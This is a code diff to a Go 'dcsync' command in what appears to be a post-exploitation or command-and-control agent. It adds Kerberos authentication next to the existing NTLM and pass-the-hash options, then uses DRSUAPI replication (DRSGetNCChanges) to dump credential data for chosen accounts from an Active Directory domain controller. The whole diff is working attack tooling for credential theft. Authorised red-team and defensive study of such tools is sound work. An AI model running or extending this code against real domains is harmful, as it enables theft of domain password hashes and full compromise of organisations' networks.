@@ -20,6 +20,7 @@ import (
 	"github.com/oiweiwei/go-msrpc/msrpc/samr/samr/v1"
 	"github.com/oiweiwei/go-msrpc/ndr"
 	"github.com/oiweiwei/go-msrpc/ssp"
+	sspcred "github.com/oiweiwei/go-msrpc/ssp/credential"
 	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/win32"
 )
 
@@ -31,13 +32,15 @@ func (c *DcsyncCommand) Description() string {
 }
 
 type dcsyncArgs struct {
-	Server   string `json:"server"`   // domain controller IP/hostname
-	Username string `json:"username"` // account with replication rights
-	Password string `json:"password"` // password
-	Hash     string `json:"hash"`     // NT hash for pass-the-hash
-	Domain   string `json:"domain"`   // domain (auto-detected from username)
-	Target   string `json:"target"`   // target account(s), comma-separated
-	Timeout  int    `json:"timeout"`  // timeout in seconds (default: 120)
+	Server   string `json:"server"`    // domain controller IP/hostname
+	Username string `json:"username"`  // account with replication rights
+	Password string `json:"password"`  // password
+	Hash     string `json:"hash"`      // NT hash for pass-the-hash
+	Domain   string `json:"domain"`    // domain (auto-detected from username)
+	Target   string `json:"target"`    // target account(s), comma-separated
+	Auth     string `json:"auth"`      // "ntlm" (default) or "kerberos"
+	DCHost   string `json:"dc_host"`   // DC FQDN for Kerberos SPN (e.g. dc01.domain.local)
+	Timeout  int    `json:"timeout"`   // timeout in seconds (default: 120)
 }
 
 type dcsyncResult struct {
@@ -98,7 +101,21 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 		return errorResult("Error: no valid target accounts specified")
 	}
 
-	cred, credErr := rpcCredential(args.Username, args.Domain, args.Password, args.Hash)
+	useKerberos := strings.EqualFold(args.Auth, "kerberos") || strings.EqualFold(args.Auth, "krb5")
+	if useKerberos && args.DCHost == "" {
+		return errorResult("Error: dc_host (DC FQDN) is required for Kerberos auth (e.g. dc01.domain.local)")
+	}
+	if useKerberos && args.Domain == "" {
+		return errorResult("Error: domain is required for Kerberos auth")
+	}
+
+	var credErr error
+	var cred sspcred.Credential
+	if useKerberos {
+		cred, credErr = rpcKerberosCredential(args.Username, args.Domain, args.Password, args.Hash)
+	} else {
+		cred, credErr = rpcCredential(args.Username, args.Domain, args.Password, args.Hash)
+	}
 	zeroCredentials(&args.Password, &args.Hash)
 	if credErr != nil {
 		return errorf("Error: %v", credErr)
@@ -108,21 +125,49 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 	ctx, cancel := context.WithTimeout(context.Background(), timeout)
 	defer cancel()
 
-	cc, err := dcerpc.Dial(ctx, "ncacn_ip_tcp:"+args.Server,
-		epm.EndpointMapper(ctx,
-			net.JoinHostPort(args.Server, "135"),
-			dcerpc.WithInsecure(),
-		),
-		dcerpc.WithCredentials(cred),
-		dcerpc.WithMechanism(ssp.SPNEGO),
-		dcerpc.WithMechanism(ssp.NTLM),
-	)
+	var cc dcerpc.Conn
+	var err error
+
+	if useKerberos {
+		ensureKRB5Mechanism()
+		cc, err = dcerpc.Dial(ctx, "ncacn_ip_tcp:"+args.Server,
+			epm.EndpointMapper(ctx,
+				net.JoinHostPort(args.Server, "135"),
+				dcerpc.WithInsecure(),
+			),
+			dcerpc.WithCredentials(cred),
+			dcerpc.WithMechanism(ssp.SPNEGO),
+			dcerpc.WithMechanism(ssp.KRB5),
+		)
+	} else {
+		cc, err = dcerpc.Dial(ctx, "ncacn_ip_tcp:"+args.Server,
+			epm.EndpointMapper(ctx,
+				net.JoinHostPort(args.Server, "135"),
+				dcerpc.WithInsecure(),
+			),
+			dcerpc.WithCredentials(cred),
+			dcerpc.WithMechanism(ssp.SPNEGO),
+			dcerpc.WithMechanism(ssp.NTLM),
+		)
+	}
 	if err != nil {
 		return errorf("Error connecting to %s via DCE-RPC: %v", args.Server, err)
 	}
 	defer cc.Close(ctx)
 
-	cli, err := drsuapi.NewDrsuapiClient(ctx, cc, dcerpc.WithSeal(), dcerpc.WithTargetName(args.Server))
+	var clientOpts []dcerpc.Option
+	clientOpts = append(clientOpts, dcerpc.WithSeal())
+	if useKerberos {
+		krbCfg := rpcKerberosConfig(cred, args.Domain, args.Server)
+		clientOpts = append(clientOpts,
+			dcerpc.WithTargetName("host/"+args.DCHost),
+			dcerpc.WithSecurityConfig(krbCfg),
+		)
+	} else {
+		clientOpts = append(clientOpts, dcerpc.WithTargetName(args.Server))
+	}
+
+	cli, err := drsuapi.NewDrsuapiClient(ctx, cc, clientOpts...)
 	if err != nil {
 		return errorf("Error creating DRSUAPI client: %v", err)
 	}
@@ -186,8 +231,10 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 	items := crackedReply.Result.Items
 
 	var sb strings.Builder
-	authMethod := "password"
-	if args.Hash != "" {
+	authMethod := "NTLM"
+	if useKerberos {
+		authMethod = "Kerberos"
+	} else if args.Hash != "" {
 		authMethod = "PTH"
 	}
 	sb.WriteString(fmt.Sprintf("[*] DCSync via DRSGetNCChanges against %s (%s)\n", args.Server, authMethod))
